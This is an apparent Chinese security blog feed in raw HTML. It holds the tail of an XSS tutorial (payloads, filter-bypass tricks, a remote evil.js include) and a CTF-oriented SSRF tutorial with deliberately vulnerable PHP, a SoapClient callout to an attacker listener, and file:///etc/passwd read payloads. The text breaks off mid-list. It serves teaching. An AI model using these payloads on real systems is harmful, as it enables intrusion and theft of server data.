class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">&gt;</span></span>//仅限于IE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>利用 link 远程包含 JavaScript 文件</strong></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>import</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://47.xxx.xxx.72/evil.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>利用 JavaScript 伪协议</strong></p><p><code>javascript:</code>  这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。当浏览器装载了这样的URL时，并不会转向某个URL，而是执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。</p><p><strong>a 标签</strong></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(1);<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>xss<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>iframe 标签</strong></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>javascript:alert(1);</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>img 标签</strong></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>javascript:alert(1)</span><span class="token punctuation">&gt;</span></span>    //IE7以下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>form 标签</strong></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Javascript:alert(1)<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>submit</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p><strong>XSS 常见绕过姿势</strong></p><ol><li><p><strong>绕过空格过滤</strong></p><p>当空格被过滤了时，我们可以用 <code>/</code> 来代替空格：</p><p>&lt;img src=x onerror=alert(<code>xss</code>);&gt;</p><p>也可以：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">&lt;img/src="x"onerror=alert(1);&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>绕过引号过滤</strong></p><p>如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">xss</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>绕过括号过滤</strong></p><p>当括号被过滤的时候可以使用throw来绕过。throw 语句用于当错误发生时抛出一个错误。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">javascript<span class="token operator">:</span>window<span class="token punctuation">.</span>onerror<span class="token operator">=</span>alert<span class="token punctuation">;</span><span class="token keyword">throw</span> <span class="token number">1</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>&lt;a onmouseover="javascript:window.onerror=alert;throw 1&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>大小写绕过</strong></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sCRiPt</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sCrIpT</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ImG</span> <span class="token attr-name">sRc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token special-attr"><span class="token attr-name">onerRor</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>双写绕过</strong></p><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scrscriptipt</span><span class="token punctuation">&gt;</span></span>alert(1);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scrscriptipt</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>imimgg</span> <span class="token attr-name">srsrcc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>利用eval()函数字符串拼接绕过</strong></p><p>与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">a<span class="token operator">=</span><span class="token string">'aler'</span><span class="token punctuation">;</span>b<span class="token operator">=</span><span class="token string">'t'</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token string">'(1)'</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token operator">+</span>c<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">a<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">aler</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>b<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">t</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token string">'(`xss`);'</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token operator">+</span>c<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>// 在js中，我们可以用反引号代替单双引号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>利用top</strong></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">top<span class="token punctuation">[</span><span class="token string">"al"</span><span class="token operator">+</span><span class="token string">"ert"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">xss</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">top<span class="token punctuation">[</span><span class="token string">"al"</span><span class="token operator">+</span><span class="token string">"ert"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><p><strong>XSS 输出点总结</strong></p><p>WAF最大的问题，在于不知道输出的位置，导致攻击者根据具体环境以及具体输出的标签类型便可以绕过。</p><ul><li><p><strong>输出在属性里</strong></p><p>例如输出的位置位于value属性中：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[输出]<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>text</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们可以选择直接闭合标签：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">"&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span><span class="token punctuation">&gt;</span></span>// 输出后如下:// <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span><span class="token punctuation">&gt;</span></span>" type=text&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果 <code>&lt; &gt;</code> 被过滤的话可以换成选择使用事件来闭合属性，并将后面的引号注释掉或闭合：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">" autofocus onfocus=alert(1)//" autofocus onfocus=alert(1) "// 输出后如下:// &lt;input value="" autofocus onfocus=alert(1)//" type=text&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样还有很多其他的payload：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">" onmouseover=prompt(0) x="" onfocusin=alert(1) autofocus x="" onfocusout=alert(1) autofocus x="" onblur=alert(1) autofocus a="<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>还有一些特殊的场景，如：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[输出]<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[输出点]<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里只能把input标签闭合，然后直接执行脚本，否则会因为type为hidden导致无法执行脚本。</p></li><li><p><strong>输出在HTML标签之间</strong></p><p>例如输出的位置如下：</p><div id="body">[输出]</div><p>直接提交 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 即可触发XSS，但是当标签是不能执行脚本的标签时，如下面这几个：</p><ul><li><code>&lt;title&gt;&lt;/title&gt;</code></li><li><code>&lt;textarea&gt;&lt;/textarea&gt;</code></li><li><code>&lt;xmp&gt;&lt;/xmp&gt;</code></li><li><code>&lt;iframe&gt;&lt;/iframe&gt;</code></li></ul><p>那么就得先把那个标签闭合（后文会讲到原理），然后在注入XSS语句，例如：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>输出在script标签之间</strong></p><p>例如：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token string">"input"</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可控位置在input，可以闭合script标签插入代码，但是同样我们仅仅闭合双引号就可以执行js代码了：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">";alert(1)//// 输出后如下:// <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//";</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>XSS 字符编码绕过</strong></p><p>在XSS中，还有一个绕过关键字过滤的方法，那就是字符编码绕过。这里给出一个编码网站：<a href="https://bianma.bmcx.com/">https://bianma.bmcx.com/</a></p><p>编码属于计算机系统的基础知识，其内容写起来估计也可以出本书了，不过或多或少我们都有所了解，总的来说，编码就是将字符变为二进制数，而解码就是将二进制数还原为字符。从浏览器请求url到在页面上显示出来也经历了一些编码和解码过程，下面大概介绍一下流程。</p><p><strong>请求网页解码流程</strong></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SSRF</title>
      <link href="/2021/07/28/ctf-ssrf/"/>
      <url>/2021/07/28/ctf-ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-SSRF"><a href="#Web-SSRF" class="headerlink" title="Web-SSRF"></a><strong>Web-SSRF</strong></h1><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://i.loli.net/2021/08/01/2ZcPWqDef1HUIt8.png"></h4><hr><h3 id="一·SSRF简介"><a href="#一·SSRF简介" class="headerlink" title="一·SSRF简介"></a><strong>一·SSRF简介</strong></h3><p>SSRF（Server-Side Request  Forgery，服务器端请求伪造）是一种由攻击者构造请求，利用服务器端发起的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）</p><p>Example：</p><pre class="line-numbers language-none"><code class="language-none">GET /index.php?url=http://google.com/ HTTP/1.1 Host: example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这里，<a href="http://example.com/">http://example.com</a> 从它的服务器获取 <a href="http://google.com/">http://google.com</a></p><p><img src="https://i.loli.net/2021/08/01/YszZNIimFTfML3A.png"></p><p><strong>容易出现SSRF的地方有：</strong></p><table><thead><tr><th>社交分享功能：获取超链接的标题等内容进行显示</th></tr></thead><tbody><tr><td>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</td></tr><tr><td>在线翻译：给网址翻译对应网页的内容</td></tr><tr><td>图片加载/下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片</td></tr><tr><td>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</td></tr><tr><td>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</td></tr><tr><td>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</td></tr><tr><td>数据库内置功能：数据库的比如mongodb的copyDatabase函数</td></tr><tr><td>邮件系统：比如接收邮件服务器地址</td></tr><tr><td>编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</td></tr><tr><td>未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</td></tr><tr><td>从远程服务器请求资源</td></tr></tbody></table><p><strong>SSRF漏洞的危害：</strong></p><table><thead><tr><th>对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。</th></tr></thead><tbody><tr><td>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等</td></tr><tr><td>对内网Web应用进行指纹识别，识别企业内部的资产信息。</td></tr><tr><td>攻击内外网的Web应用，主要是使用HTTP GET/POST请求就可以实现的攻击，如sql注入、文件上传等。</td></tr><tr><td>利用file协议读取服务器本地文件等。</td></tr><tr><td>进行跳板攻击等。</td></tr></tbody></table><hr><h3 id="二·SSRF漏洞相关函数和类"><a href="#二·SSRF漏洞相关函数和类" class="headerlink" title="二·SSRF漏洞相关函数和类"></a><strong>二·SSRF漏洞相关函数和类</strong></h3><ul><li><p>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</p></li><li><p>readfile()：输出一个文件的内容。</p></li><li><p>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</p></li><li><p>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</p></li><li><p>fopen()：打开一个文件文件或者 URL。</p></li><li><p>……</p><p>上述函数函数使用不当会造成SSRF漏洞。 此外，PHP原生类SoapClient在触发反序列化时可导致SSRF。</p></li></ul><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><p>测试代码：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php$url = $_GET['url'];;echo file_get_contents($url);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述测试代码中，file_get_contents() 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似 <code>ssrf.php?url=../../../../../etc/passwd</code> 的paylaod即可读取服务器本地的任意文件。</p><p>readfile()函数与file_get_contents()函数相似。</p><h4 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h4><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。<br>fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p><p>测试代码：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php$host=$_GET['url'];$fp = fsockopen($host, 80, $errno, $errstr, 30);if (!$fp) {    echo "$errstr ($errno)&lt;br /&gt;\n";} else {    $out = "GET / HTTP/1.1\r\n";    $out .= "Host: $host\r\n";    $out .= "Connection: Close\r\n\r\n";    fwrite($fp, $out);    while (!feof($fp)) {        echo fgets($fp, 128);    }    fclose($fp);}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 <code>ssrf.php?url=www.baidu.com</code> 即可成功触发ssrf并返回百度主页</p><p>但是该函数的SSRF无法读取本地文件。</p><h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h4><p>curl_init(url)函数初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</p><p>测试代码：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php if (isset($_GET['url'])){$link = $_GET['url'];$curlobj = curl_init(); // 创建新的 cURL 资源curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // 设置 URL 和相应的选项$result=curl_exec($curlobj); // 抓取 URL 并把它传递给浏览器curl_close($curlobj); // 关闭 cURL 资源，并且释放系统资源 // $filename = './curled/'.rand().'.txt';// file_put_contents($filename, $result); echo $result;}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 <code>ssrf.php?url=www.baidu.com</code> 即可成功触发ssrf并返回百度主页</p><p>也可以使用file协议读取本地文件</p><h4 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h4><p>SOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。</p><p>SoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的 <code>__call</code> 方法，那么 <code>__call</code> 便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：</p><pre class="line-numbers language-none"><code class="language-none">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>第一个参数是用来指明是否是wsdl模式。</li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。</li></ul><p>知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数为一个包含location和uri的数组，location选项的值设置为target_url：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php$a = new SoapClient(null,array('uri'=&gt;'http://47.xxx.xxx.72:2333', 'location'=&gt;'http://47.xxx.xxx.72:2333/aaa'));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>47.xxx.xxx.72监听2333端口，访问ssrf.php，即可在47.xxx.xxx.72上得到访问的数据：</p><p>由于它仅限于http/https协议，所以用处不是很大。但是如果这里的http头部还存在crlf漏洞，那么我们就可以进行ssrf+crlf，注入或修改一些http请求头，详情请看：<a href="https://www.anquanke.com/post/id/202025">《SoapClient+crlf组合拳进行SSRF》</a></p><h3 id="三·SSRF漏洞利用的相关协议"><a href="#三·SSRF漏洞利用的相关协议" class="headerlink" title="三·SSRF漏洞利用的相关协议"></a><strong>三·SSRF漏洞利用的相关协议</strong></h3><p>SSRF漏洞的利用所涉及的协议有：</p><ul><li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li><li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li><li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li><li>http/s协议：探测内网主机存活</li></ul><p>下面我们对这些协议的利用进行逐一演示。</p><h4 id="常见利用方式（file、http-s和dict协议）"><a href="#常见利用方式（file、http-s和dict协议）" class="headerlink" title="常见利用方式（file、http/s和dict协议）"></a>常见利用方式（file、http/s和dict协议）</h4><p>SSRF的利用主要就是读取内网文件、探测内网主机存活、扫描内网端口、攻击内网其他应用等，而这些利用的手法无一不与这些协议息息相关。</p><p>以下几个演示所用的测试代码：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php if (isset($_GET['url'])){$link = $_GET['url'];$curlobj = curl_init(); // 创建新的 cURL 资源curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // 设置 URL 和相应的选项$result=curl_exec($curlobj); // 抓取 URL 并把它传递给浏览器curl_close($curlobj); // 关闭 cURL 资源，并且释放系统资源 // $filename = './curled/'.rand().'.txt';// file_put_contents($filename, $result); echo $result;}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="读取内网文件（file协议）"><a href="#读取内网文件（file协议）" class="headerlink" title="读取内网文件（file协议）"></a>读取内网文件（file协议）</h5><p>我们构造如下payload，即可将服务器上的本地文件及网站源码读取出来：</p><pre class="line-numbers language-none"><code class="language-none">ssrf.php?url=file:///etc/passwdssrf.php?url=file:///var/www/html/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="探测内网主机存活（http-s协议）"><a href="#探测内网主机存活（http-s协议）" class="headerlink" title="探测内网主机存活（http/s协议）"></a>探测内网主机存活（http/s协议）</h5><p>一般是先想办法得到目标主机的网络配置信息，如读取/etc/hosts、/proc/net/arp、/proc/net/fib_trie等文件，从而获得目标主机的内网网段并进行爆破。</p><p>域网IP地址范围分三类，以下IP段为内网IP段：</p><pre class="line-numbers language-none"><code class="language-none">C类：192.168.0.0 - 192.168.255.255 B类：172.16.0.0 - 172.31.255.255 A类：10.0.0.0 - 10.255.255.255<span aria-hidden="true" 